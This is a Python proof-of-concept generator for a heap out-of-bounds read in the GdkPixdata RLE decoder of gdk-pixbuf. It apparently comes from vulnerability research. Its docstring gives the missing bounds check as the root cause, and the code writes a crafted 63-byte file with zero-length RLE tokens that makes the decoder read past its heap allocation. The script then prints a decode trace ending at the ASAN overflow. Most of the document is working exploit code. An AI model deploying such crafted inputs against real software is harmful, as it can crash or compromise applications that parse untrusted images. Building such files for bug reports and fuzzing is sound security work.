#!/usr/bin/env python3
"""
VULN-002 PoC generator: GdkPixdata RLE decoder heap OOB read.

Root cause: gdk_pixbuf_from_pixdata() RLE loop checks image_buffer < image_limit
but never bounds-checks rle_buffer.

Strategy to reliably trigger ASAN via the real binary:
  - pixel_data = 104 zero bytes (all 0x00 → length-0 non-run tokens)
  - File = 24 + 104 = 128 bytes → GString allocation = nearest_power(1,129) = 256?
    or nearest_power(1,129) = 128? Let's use 104 so file=128 → allocation=128 bytes.
  - Actually: 128 bytes stream → GString allocation = nearest_power(1,129) = 256
  - Better: 63 bytes stream (24+39) → allocation = nearest_power(1,64) = 64 bytes

  Use stream = 63 bytes (24 header + 39 pixel_data of zeros):
    GString allocation = nearest_power(1, 64) = 64
    Null terminator at byte 63 (in allocation)
    Byte 64 = ASAN redzone

  All tokens are 0x00 (non-run, length=0) → no output, rle_buffer advances 1 per iter
  image_limit = rowstride * height (must be >> 0 so loop keeps running)
  rle_buffer reads bytes 24..63 (40 zero tokens), then tries byte 64 → ASAN!
  check_overrun never triggered because length=0 → 0 + 0 > image_limit is always FALSE.

GdkPixdata enum values (from gdk-pixdata.h):
  GDK_PIXDATA_COLOR_TYPE_RGB    = 0x01          (bits 0-7)
  GDK_PIXDATA_SAMPLE_WIDTH_8    = 0x01 << 16    = 0x00010000
  GDK_PIXDATA_ENCODING_RLE      = 0x02 << 24    = 0x02000000
  RGB RLE 8-bit: 0x02000000 | 0x00010000 | 0x00000001 = 0x02010001
"""

import struct
import os

OUT = os.path.join(os.path.dirname(os.path.abspath(__file__)), "vuln_002.gdkp")

MAGIC       = 0x47646b50   # b"GdkP"
HEADER_LEN  = 24

# RGB RLE 8-bit: encoding=RLE(0x02<<24) | sample_width=8(0x01<<16) | color=RGB(0x01)
PIXDATA_TYPE = 0x02010001

# Geometry: image_limit = rowstride * height large enough to keep loop running
# even after reading 40 zero-length tokens (which produce no output)
WIDTH     = 1
HEIGHT    = 1000     # image_limit = 3*1000 = 3000 bytes >> 0
ROWSTRIDE = 3        # width * bpp (bpp=3 for RGB)

# File size = 63 bytes → GString allocation = nearest_power(1, 64) = 64 bytes
# pixel_data = 39 zero bytes (positions 24-62, i.e. 39 bytes)
# GString null terminator at byte 63 (also 0x00)
# → 40 total 0x00 bytes that rle_buffer will read (bytes 24-63), producing zero output
# Byte 64 = ASAN redzone → OOB read, heap-buffer-overflow!
PIXEL_DATA_LEN = 63 - HEADER_LEN   # = 39
PIXEL_DATA = bytes(PIXEL_DATA_LEN)  # all zeros

TOTAL_LEN = HEADER_LEN + PIXEL_DATA_LEN   # = 63

header = struct.pack(">IIIIII",
    MAGIC,
    TOTAL_LEN,
    PIXDATA_TYPE,
    ROWSTRIDE,
    WIDTH,
    HEIGHT,
)

data = header + PIXEL_DATA
assert len(data) == 63, f"Expected 63 bytes, got {len(data)}"

with open(OUT, "wb") as f:
    f.write(data)

print(f"[+] Written {len(data)} bytes to {OUT}")
print(f"    pixdata_type=0x{PIXDATA_TYPE:08X} (RGB RLE 8-bit)")
print(f"    rowstride={ROWSTRIDE}  width={WIDTH}  height={HEIGHT}")
print(f"    image_limit = {ROWSTRIDE * HEIGHT} bytes")
print(f"    pixel_data: {PIXEL_DATA_LEN} zero bytes (positions 24-62)")
print(f"")
print(f"    RLE decode trace:")
print(f"      GString allocation: nearest_power(1, 64) = 64 bytes")
print(f"      Iters 1-39: read bytes 24-62 = 0x00, length=0, no output, rle_buffer advances")
print(f"      Iter 40: read byte 63 = 0x00 (GString null terminator), rle_buffer at 64")
print(f"      Iter 41: read byte 64 → ASAN heap-buffer-overflow!")
print(f"      check_overrun never set (length=0, 0 > image_limit always FALSE)")
